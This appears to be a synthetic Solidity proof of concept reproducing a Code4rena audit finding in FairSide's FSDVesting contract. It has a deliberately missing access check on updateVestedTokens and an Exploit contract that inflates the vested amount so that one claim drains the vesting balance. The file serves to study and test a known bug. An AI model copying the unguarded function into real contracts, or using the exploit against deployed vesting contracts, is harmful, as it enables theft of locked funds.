// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  FairSide FSDVesting.updateVestedTokens (Code4rena, Nov 2021, finding #42324).
    SYNTHETIC, cheatcode-free. `_user == beneficiary` does not check msg.sender,
    and there is no onlyFsd (@> VULN). At the cliff the fair claim on 100 is 5.
    Inflating amount to 2000 makes the 5% cliff unlock equal the whole balance. */

contract VestToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract FSDVesting {
    address public beneficiary;
    address public fsd;
    uint256 public amount;
    uint256 public claimed;
    VestToken public immutable token;
    uint256 public constant IMMEDIATE_BPS = 500;
    uint256 public constant DURATION = 18 * 30 days;

    constructor(address beneficiary_, address fsd_, VestToken token_) {
        beneficiary = beneficiary_;
        fsd = fsd_;
        token = token_;
        amount = 100;
    }

    function updateVestedTokens(address _user, uint256 _amount) external {
        require(_user == beneficiary, "FSDVesting::updateVestedTokens: Only beneficiary can update the vested amount");
        require(_amount != 0, "FSDVesting::updateVestedTokens: Amount cannot be zero");
        // @> VULN: no onlyFsd, and _user is an argument, so any caller can inflate amount.
        amount = amount + _amount;
    }

    function updateGuarded(address _user, uint256 _amount) external {
        require(msg.sender == fsd, "FSDVesting::updateVestedTokens: Only FSD can update the vested amount");
        require(_user == beneficiary, "beneficiary");
        require(_amount != 0, "amount");
        amount = amount + _amount;
    }

    function calculateVestingClaim() public view returns (uint256) {
        uint256 immediate = amount * IMMEDIATE_BPS / 10_000;
        uint256 elapsed = block.timestamp;
        if (elapsed > DURATION) elapsed = DURATION;
        uint256 linear = (amount - immediate) * elapsed / DURATION;
        uint256 vested = immediate + linear;
        if (vested <= claimed) return 0;
        return vested - claimed;
    }

    function claimVestedTokens() external returns (uint256 claimable) {
        claimable = calculateVestingClaim();
        uint256 bal = token.balanceOf(address(this));
        if (claimable > bal) claimable = bal;
        claimed += claimable;
        token.transfer(beneficiary, claimable);
    }
}

contract Stranger {
    function poke(FSDVesting vest, address user, uint256 amt) external {
        vest.updateVestedTokens(user, amt);
    }
}

contract Exploit {
    VestToken public token; // nonce 1
    FSDVesting public vest; // nonce 2
    Stranger public stranger; // nonce 3

    constructor() {
        token = new VestToken();
        vest = new FSDVesting(address(this), address(0xF5D), token);
        stranger = new Stranger();
        token.mint(address(vest), 100);
    }

    function run() external {
        uint256 fair = vest.calculateVestingClaim();
        require(fair == 5, "fair cliff claim is 5");
        require(msg.sender != vest.beneficiary(), "caller need not be the beneficiary");
        stranger.poke(vest, address(this), 1900);
        require(vest.amount() == 2000, "amount inflated to 2000");
        uint256 paid = vest.claimVestedTokens();
        require(paid == 100, "claim pays the whole balance");
        require(token.balanceOf(address(this)) == 100, "beneficiary received 100");
        require(token.balanceOf(address(vest)) == 0, "vesting is empty");
        (bool ok,) = address(vest).call(abi.encodeWithSelector(vest.updateGuarded.selector, address(this), 1900));
        require(!ok, "guarded update rejects a non-FSD caller");
    }
}
